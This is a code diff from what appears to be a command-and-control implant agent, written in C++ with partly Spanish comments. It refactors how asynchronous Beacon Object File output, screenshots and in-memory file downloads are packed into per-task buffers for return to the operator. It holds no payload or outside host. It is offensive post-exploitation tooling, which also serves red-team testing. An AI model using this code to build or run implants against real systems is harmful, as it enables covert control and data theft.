@@ -6,48 +6,63 @@
 #include "main.h"
 #include "Boffer.h"
 
-Packer* bofOutputPacker = NULL;
-int     bofOutputCount  = 0;
-ULONG   bofTaskId       = 0;
 HANDLE  g_StoredToken   = NULL;
 
-BOOL IsAsyncBofThread();
-void AsyncBofOutput(int type, PBYTE data, int dataSize);
+// Globals para el path SÍNCRONO — misma semántica que el original.
+// El path async usa ctx->outputBuffer vía tls_CurrentBofContext.
+Packer* bofOutputPacker = NULL;
+ULONG   bofTaskId       = 0;
+
+void InitBofOutputData()
+{
+    if (bofOutputPacker == NULL)
+        bofOutputPacker = new Packer();
+}
+
+static void BofOutputToContext(AsyncBofContext* ctx, int type, PBYTE data, int dataSize)
+{
+    if (!ctx || !ctx->outputBuffer)
+        return;
+
+    ApiWin->EnterCriticalSection(&ctx->outputLock);
+    ctx->outputBuffer->Pack32(ctx->taskId);
+    ctx->outputBuffer->Pack32(51);  // COMMAND_EXEC_BOF_OUT
+    ctx->outputBuffer->Pack32(type);
+    ctx->outputBuffer->PackBytes(data, dataSize);
+    ApiWin->LeaveCriticalSection(&ctx->outputLock);
+
+    // Signal the main thread that output is available.
+    // This unblocks ConnectorSMB::Sleep (WaitForMultipleObjects) without
+    // requiring the 50ms polling loop, and also allows WaitMaskWithEvent
+    // (HTTP/TCP/DNS) to wake up before the full sleep_delay expires when
+    // the BOF produces intermediate output.
+    if (g_AsyncBofManager)
+        g_AsyncBofManager->SignalWakeup();
+}
 
 void BofOutputToTask(int type, PBYTE data, int dataSize)
 {
-	if (IsAsyncBofThread()) {
-		AsyncBofOutput(type, data, dataSize);
-		return;
-	}
-	
-	if (bofOutputPacker) {
-		bofOutputPacker->Pack32(bofTaskId);
-		bofOutputPacker->Pack32(51); // COMMAND_EXEC_BOF_OUT
-		bofOutputPacker->Pack32(type);
-		bofOutputPacker->PackBytes(data, dataSize);
-	}
-}
+    // Si hay un contexto async en TLS (hilo del monitor u otro async BOF),
+    // escribir al buffer propio del contexto. De lo contrario (hilo principal
+    // ejecutando un BOF síncrono), escribir al bofOutputPacker global.
+    // Esto preserva exactamente la semántica del original y evita que
+    // ObjectExecute toque tls_CurrentBofContext del hilo principal.
+    if (tls_CurrentBofContext) {
+        BofOutputToContext(tls_CurrentBofContext, type, data, dataSize);
+        return;
+    }
 
-void AsyncBofOutput(int type, PBYTE data, int dataSize)
-{
-	AsyncBofContext* ctx = tls_CurrentBofContext;
-	if (!ctx || !ctx->outputBuffer)
-		return;
-
-	ApiWin->EnterCriticalSection(&ctx->outputLock);
-
-	ctx->outputBuffer->Pack32(ctx->taskId);
-	ctx->outputBuffer->Pack32(51);  // COMMAND_EXEC_BOF_OUT
-	ctx->outputBuffer->Pack32(type);
-	ctx->outputBuffer->PackBytes(data, dataSize);
-
-	ApiWin->LeaveCriticalSection(&ctx->outputLock);
+    if (bofOutputPacker) {
+        bofOutputPacker->Pack32(bofTaskId);
+        bofOutputPacker->Pack32(51);  // COMMAND_EXEC_BOF_OUT
+        bofOutputPacker->Pack32(type);
+        bofOutputPacker->PackBytes(data, dataSize);
+    }
 }
 
 BOOL IsAsyncBofThread()
 {
-	return (tls_CurrentBofContext != NULL);
+    return (tls_CurrentBofContext != NULL);
 }
 
 unsigned int swap_endianess(unsigned int indata)
@@ -440,25 +455,6 @@ BOOL BeaconGetSyscallInformation(PBEACON_SYSCALLS info, BOOL resolveIfNotInitial
 	return FALSE;
 }
 
-//LPVOID BeaconVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
-//LPVOID BeaconVirtualAllocEx(HANDLE processHandle, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
-//BOOL BeaconVirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
-//BOOL BeaconVirtualProtectEx(HANDLE processHandle, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
-//BOOL BeaconVirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
-//BOOL BeaconGetThreadContext(HANDLE threadHandle, PCONTEXT threadContext);
-//BOOL BeaconSetThreadContext(HANDLE threadHandle, PCONTEXT threadContext);
-//DWORD BeaconResumeThread(HANDLE threadHandle);
-//HANDLE BeaconOpenProcess(DWORD desiredAccess, BOOL inheritHandle, DWORD processId);
-//HANDLE BeaconOpenThread(DWORD desiredAccess, BOOL inheritHandle, DWORD threadId);
-//BOOL BeaconCloseHandle(HANDLE object);
-//BOOL BeaconUnmapViewOfFile(LPCVOID baseAddress);
-//SIZE_T BeaconVirtualQuery(LPCVOID address, PMEMORY_BASIC_INFORMATION buffer, SIZE_T length);
-//BOOL BeaconDuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions);
-//BOOL BeaconReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesRead);
-//BOOL BeaconWriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
-
-/// Async BOF API
-
 BOOL BeaconRegisterThreadCallback(PVOID callbackFunction, PVOID callbackData)
 {
 	return TRUE;
@@ -483,8 +479,6 @@ HANDLE BeaconGetStopJobEvent()
 	return ctx->hStopEvent;
 }
 
-/// 3rd party API
-
 HMODULE proxy_LoadLibraryA(LPCSTR lpLibFileName)
 {
 	return ApiWin->LoadLibraryA(lpLibFileName);
@@ -505,17 +499,22 @@ BOOL proxy_FreeLibrary(HMODULE hLibModule)
 	return ApiWin->FreeLibrary(hLibModule);
 }
 
-////////// AX Functions
-
 void AxAddScreenshot(char* note, char* data, int len)
 {
-	if (IsAsyncBofThread()) {
-		AsyncBofOutput(CALLBACK_AX_SCREENSHOT, (PBYTE)data, len);
+	if (tls_CurrentBofContext) {
+		AsyncBofContext* ctx = tls_CurrentBofContext;
+		ApiWin->EnterCriticalSection(&ctx->outputLock);
+		ctx->outputBuffer->Pack32(ctx->taskId);
+		ctx->outputBuffer->Pack32(51);
+		ctx->outputBuffer->Pack32(CALLBACK_AX_SCREENSHOT);
+		ctx->outputBuffer->PackStringA(note);
+		ctx->outputBuffer->PackBytes((PBYTE)data, len);
+		ApiWin->LeaveCriticalSection(&ctx->outputLock);
 		return;
 	}
 	if (bofOutputPacker) {
 		bofOutputPacker->Pack32(bofTaskId);
-		bofOutputPacker->Pack32(51);			// COMMAND_EXEC_BOF_OUT
+		bofOutputPacker->Pack32(51);
 		bofOutputPacker->Pack32(CALLBACK_AX_SCREENSHOT);
 		bofOutputPacker->PackStringA(note);
 		bofOutputPacker->PackBytes((PBYTE)data, len);
@@ -524,13 +523,20 @@ void AxAddScreenshot(char* note, char* data, int len)
 
 void AxDownloadMemory(char* filename, char* data, int len)
 {
-	if (IsAsyncBofThread()) {
-		AsyncBofOutput(CALLBACK_AX_DOWNLOAD_MEM, (PBYTE)data, len);
+	if (tls_CurrentBofContext) {
+		AsyncBofContext* ctx = tls_CurrentBofContext;
+		ApiWin->EnterCriticalSection(&ctx->outputLock);
+		ctx->outputBuffer->Pack32(ctx->taskId);
+		ctx->outputBuffer->Pack32(51);
+		ctx->outputBuffer->Pack32(CALLBACK_AX_DOWNLOAD_MEM);
+		ctx->outputBuffer->PackStringA(filename);
+		ctx->outputBuffer->PackBytes((PBYTE)data, len);
+		ApiWin->LeaveCriticalSection(&ctx->outputLock);
 		return;
 	}
 	if (bofOutputPacker) {
 		bofOutputPacker->Pack32(bofTaskId);
-		bofOutputPacker->Pack32(51);			// COMMAND_EXEC_BOF_OUT
+		bofOutputPacker->Pack32(51);
 		bofOutputPacker->Pack32(CALLBACK_AX_DOWNLOAD_MEM);
 		bofOutputPacker->PackStringA(filename);
 		bofOutputPacker->PackBytes((PBYTE)data, len);
